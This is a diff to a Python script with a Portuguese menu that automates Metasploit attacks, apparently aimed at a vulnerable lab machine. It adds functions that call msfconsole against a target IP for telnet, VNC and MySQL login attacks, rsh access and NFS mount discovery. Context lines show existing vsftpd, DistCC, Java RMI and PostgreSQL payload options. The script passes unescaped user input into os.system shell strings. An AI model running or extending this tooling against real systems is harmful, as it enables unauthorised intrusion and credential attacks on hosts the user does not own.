@@ -55,6 +55,53 @@ def exploit_postgres_payload(ip, lhost):
     exit"
     ''')
 
+def exploit_telnet(ip):
+    os.system(f'''
+    msfconsole -q -x "
+    use auxiliary/scanner/telnet/telnet_login;
+    set RHOSTS {ip};
+    exploit;
+    exit"
+    ''')
+
+def exploit_vnc(ip):
+    os.system(f'''
+    msfconsole -q -x "
+    use auxiliary/scanner/vnc/vnc_login;
+    set RHOSTS {ip};
+    exploit;
+    exit"
+    ''')
+
+def exploit_rservices(ip):
+    os.system(f'''
+    msfconsole -q -x "
+    use exploit/unix/rservices/rsh_client;
+    set RHOSTS {ip};
+    exploit;
+    exit"
+    ''')
+
+def exploit_nfs(ip):
+    os.system(f'''
+    msfconsole -q -x "
+    use auxiliary/scanner/nfs/nfsmount;
+    set RHOSTS {ip};
+    exploit;
+    exit"
+    ''')
+
+def exploit_mysql(ip, username, password):
+    os.system(f'''
+    msfconsole -q -x "
+    use auxiliary/scanner/mysql/mysql_login;
+    set RHOSTS {ip};
+    set USERNAME {username};
+    set PASSWORD {password};
+    exploit;
+    exit"
+    ''')
+
 def main():
     while True:
         print("Escolha a vulnerabilidade para explorar:")
@@ -64,13 +111,18 @@ def main():
         print("4. DistCC Daemon Command Execution (Porta 3632)")
         print("5. Java RMI Server Insecure Default Configuration (Porta 1099)")
         print("6. PostgreSQL Payload Execution (Porta 5432)")
+        print("7. Telnet Login (Porta 23)")
+        print("8. VNC Authentication Bypass (Porta 5900)")
+        print("9. RServices Unauthorized Access (Portas 512, 513, 514)")
+        print("10. NFS Unauthorized Access (Porta 2049)")
+        print("11. MySQL Login with Default Credentials (Porta 3306)")
         print("0. Sair")
         
         escolha = input("Opção: ")
         
         if escolha == '0':
             break
-        elif escolha in ['1', '2', '3', '4', '5', '6']:
+        elif escolha in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']:
             ip = input("Digite o endereço IP do alvo: ")
             if escolha == '1':
                 exploit_vsftpd(ip)
@@ -85,6 +137,18 @@ def main():
             elif escolha == '6':
                 lhost = input("Digite o endereço IP do seu host (LHOST): ")
                 exploit_postgres_payload(ip, lhost)
+            elif escolha == '7':
+                exploit_telnet(ip)
+            elif escolha == '8':
+                exploit_vnc(ip)
+            elif escolha == '9':
+                exploit_rservices(ip)
+            elif escolha == '10':
+                exploit_nfs(ip)
+            elif escolha == '11':
+                username = input("Digite o nome de usuário do MySQL: ")
+                password = input("Digite a senha do MySQL: ")
+                exploit_mysql(ip, username, password)
         else:
             print("Opção inválida. Tente novamente.")
 
